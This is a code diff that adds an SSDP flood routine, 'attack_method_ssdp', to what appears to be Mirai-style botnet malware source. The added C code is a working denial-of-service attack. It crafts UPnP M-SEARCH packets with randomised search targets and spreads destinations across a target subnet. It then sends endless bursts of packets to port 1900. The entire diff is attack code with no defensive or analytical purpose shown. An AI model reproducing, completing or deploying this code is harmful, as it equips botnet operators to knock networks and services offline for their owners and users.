@@ -2554,3 +2554,72 @@ void attack_method_asyn(uint8_t targs_len, struct attack_target *targs, uint8_t 
         }
     }
 }
+void attack_method_ssdp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+{
+    int i;
+    char **pkts = calloc(targs_len, sizeof (char *));
+    int *fds = calloc(targs_len, sizeof (int));
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 1900);
+    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
+    struct sockaddr_in bind_addr = {0};
+    
+    if (sport == 0xffff)
+        sport = rand_next() % 60000 + 1024;
+    else
+        sport = htons(sport);
+    
+    const char *msearch_template = 
+        "M-SEARCH * HTTP/1.1\r\n"
+        "HOST: 239.255.255.250:1900\r\n"
+        "MAN: \"ssdp:discover\"\r\n"
+        "ST: %s\r\n"
+        "MX: 3\r\n"
+        "\r\n";
+    
+    const char *st_types[] = {
+        "ssdp:all",
+        "upnp:rootdevice",
+        "urn:schemas-upnp-org:device:InternetGatewayDevice:1",
+        "urn:schemas-upnp-org:service:WANIPConnection:1",
+        "urn:schemas-wifialliance-org:service:WFAWLANConfig:1"
+    };
+    
+    for (i = 0; i < targs_len; i++)
+    {
+        pkts[i] = calloc(512, sizeof (char));
+        targs[i].sock_addr.sin_port = htons(dport);
+        
+        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
+            continue;
+        
+        bind_addr.sin_family = AF_INET;
+        bind_addr.sin_port = htons(sport);
+        bind_addr.sin_addr.s_addr = 0;
+        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in));
+        
+        if (targs[i].netmask < 32)
+            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+        
+        const char *st = st_types[rand_next() % (sizeof(st_types) / sizeof(st_types[0]))];
+        int pkt_len = snprintf(pkts[i], 512, msearch_template, st);
+        
+        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+    }
+    
+    while (TRUE)
+    {
+        for (i = 0; i < targs_len; i++)
+        {
+            if (fds[i] > 0)
+            {
+                const int burst = 16;
+                for (int b = 0; b < burst; b++)
+                {
+                    int pkt_len = strlen(pkts[i]);
+                    send(fds[i], pkts[i], pkt_len, MSG_NOSIGNAL);
+                }
+            }
+        }
+        usleep(10000);
+    }
+}
